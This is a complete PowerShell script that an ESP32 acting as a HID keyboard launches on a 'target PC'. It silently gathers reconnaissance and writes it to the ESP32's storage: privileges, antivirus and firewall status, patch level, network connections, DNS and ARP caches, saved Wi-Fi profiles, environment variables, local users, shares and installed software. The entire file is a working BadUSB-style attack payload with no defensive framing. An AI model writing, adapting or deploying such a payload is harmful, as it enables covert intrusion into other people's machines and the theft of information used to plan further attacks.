# =============================================================================
# collect.ps1 — ESP32 PC Reconnaissance Script
#
# Runs on the TARGET PC, launched via HID keyboard by the ESP32.
# Results are written to the ESP32 drive as recon-<date>-<time>.txt
#
# Drive detection: identified by volume label "ESP32" so SD cards and
# other removable drives are ignored even if plugged in simultaneously.
# =============================================================================

# ── Drive detection ───────────────────────────────────────────────────────────
$drive = (Get-WmiObject Win32_LogicalDisk |
          Where-Object { $_.VolumeName -eq 'ESP32' } |
          Select-Object -First 1 -ExpandProperty DeviceID)

if (-not $drive) {
    $drive = (Get-WmiObject Win32_LogicalDisk |
              Where-Object { $_.DriveType -eq 2 } |
              ForEach-Object { if (Test-Path ($_.DeviceID + '\collect.ps1')) { $_.DeviceID } } |
              Select-Object -First 1)
}

if (-not $drive) { exit 1 }

$ts  = Get-Date -Format 'yyyyMMdd-HHmmss'
$out = $drive + '\recon-' + $ts + '.txt'

& {

# ── Header ────────────────────────────────────────────────────────────────────
'=' * 60
'  ESP32 RECON REPORT'
'  Generated : ' + (Get-Date)
'  Hostname  : ' + $env:COMPUTERNAME
'  User      : ' + $env:USERNAME
'  Domain    : ' + $env:USERDOMAIN
'=' * 60
''

# ── System overview ───────────────────────────────────────────────────────────
'[SYSTEM INFO]'
systeminfo
''

# ── Logged-in user and privileges ─────────────────────────────────────────────
'[LOGGED USER]'
$env:USERNAME
$env:USERDOMAIN
whoami /priv
''

# ── CPU ───────────────────────────────────────────────────────────────────────
'[CPU]'
Get-CimInstance Win32_Processor |
    Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed |
    Format-List
''

# ── RAM ───────────────────────────────────────────────────────────────────────
'[MEMORY]'
Get-CimInstance Win32_PhysicalMemory |
    Select-Object Manufacturer, Capacity, Speed, MemoryType |
    Format-List
''

# ── Storage ───────────────────────────────────────────────────────────────────
'[STORAGE]'
Get-CimInstance Win32_DiskDrive |
    Select-Object Model, Size, InterfaceType, SerialNumber |
    Format-List
''

# ── GPU ───────────────────────────────────────────────────────────────────────
'[GPU]'
Get-CimInstance Win32_VideoController |
    Select-Object Name, AdapterRAM, DriverVersion, VideoProcessor |
    Format-List
''

# ── Motherboard ───────────────────────────────────────────────────────────────
'[BASEBOARD]'
Get-CimInstance Win32_BaseBoard |
    Select-Object Manufacturer, Product, Version, SerialNumber |
    Format-List
''

# ── BIOS ──────────────────────────────────────────────────────────────────────
'[BIOS]'
Get-CimInstance Win32_BIOS |
    Select-Object Manufacturer, Name, Version, SerialNumber, ReleaseDate |
    Format-List
''

# ── Windows activation ────────────────────────────────────────────────────────
'[WINDOWS ACTIVATION]'
cscript //nologo $env:windir\system32\slmgr.vbs /xpr
''

# ── Recent Windows updates ────────────────────────────────────────────────────
'[RECENT UPDATES]'
Get-HotFix |
    Sort-Object InstalledOn -Descending |
    Select-Object -First 10 |
    Format-Table HotFixID, Description, InstalledOn -AutoSize
''

# ── Antivirus / Defender status ───────────────────────────────────────────────
'[ANTIVIRUS STATUS]'
Get-MpComputerStatus |
    Select-Object AMServiceEnabled, AntispywareEnabled, AntivirusEnabled,
                  RealTimeProtectionEnabled, IoavProtectionEnabled,
                  AntivirusSignatureLastUpdated |
    Format-List
''

# ── Firewall status ───────────────────────────────────────────────────────────
'[FIREWALL STATUS]'
Get-NetFirewallProfile |
    Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction |
    Format-Table -AutoSize
''

# ── Network interfaces ────────────────────────────────────────────────────────
'[NETWORK INTERFACES]'
ipconfig /all
''

# ── Active TCP connections ────────────────────────────────────────────────────
'[ACTIVE TCP CONNECTIONS]'
Get-NetTCPConnection -State Established, Listen |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State |
    Sort-Object State, LocalPort |
    Format-Table -AutoSize
''

# ── Routing table ─────────────────────────────────────────────────────────────
'[ROUTING TABLE]'
Get-NetRoute |
    Select-Object DestinationPrefix, NextHop, RouteMetric, InterfaceAlias |
    Format-Table -AutoSize
''

# ── Saved Wi-Fi profiles ──────────────────────────────────────────────────────
'[WIFI PROFILES]'
netsh wlan show profiles
''

# ── DNS cache ─────────────────────────────────────────────────────────────────
'[DNS CACHE]'
Get-DnsClientCache |
    Select-Object Entry, RecordName, RecordType, Data |
    Format-Table -AutoSize
''

# ── ARP cache ─────────────────────────────────────────────────────────────────
'[ARP CACHE]'
arp -a
''

# ── USB devices ───────────────────────────────────────────────────────────────
'[USB DEVICES]'
Get-PnpDevice -PresentOnly |
    Where-Object { $_.InstanceId -match 'USB' } |
    Select-Object FriendlyName, Status, Class |
    Format-Table -AutoSize
''

# ── Running processes ─────────────────────────────────────────────────────────
'[TOP PROCESSES BY MEMORY]'
Get-Process |
    Sort-Object WorkingSet -Descending |
    Select-Object -First 20 |
    Format-Table Name, Id, @{Name='Mem (MB)';Expression={[math]::Round($_.WorkingSet/1MB,2)}}, Path -AutoSize
''

# ── Startup programs ─────────────────────────────────────────────────────────
'[STARTUP PROGRAMS]'
Get-CimInstance Win32_StartupCommand |
    Select-Object Name, Command, Location, User |
    Format-Table -AutoSize
''

# ── Scheduled tasks (non-Microsoft) ──────────────────────────────────────────
'[SCHEDULED TASKS]'
Get-ScheduledTask |
    Where-Object { $_.TaskPath -notlike '\Microsoft\*' } |
    Select-Object TaskName, TaskPath, State |
    Format-Table -AutoSize
''

# ── Local users and groups ────────────────────────────────────────────────────
'[LOCAL USERS]'
Get-LocalUser |
    Select-Object Name, Enabled, LastLogon, PasswordLastSet, Description |
    Format-Table -AutoSize
''

'[LOCAL GROUPS]'
Get-LocalGroup |
    Select-Object Name, Description |
    Format-Table -AutoSize
''

# ── Shared folders ────────────────────────────────────────────────────────────
'[SHARED FOLDERS]'
Get-SmbShare |
    Select-Object Name, Path, Description |
    Format-Table -AutoSize
''

# ── Environment variables ─────────────────────────────────────────────────────
'[ENVIRONMENT VARIABLES]'
Get-ChildItem Env: |
    Sort-Object Name |
    Format-Table Name, Value -AutoSize
''

# ── Installed software (both registry hives) ─────────────────────────────────
'[INSTALLED SOFTWARE]'
Get-ItemProperty `
    HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*,
    HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Where-Object { $_.DisplayName } |
    Sort-Object DisplayName |
    Format-Table -AutoSize
''

} | Out-File -FilePath $out -Encoding UTF8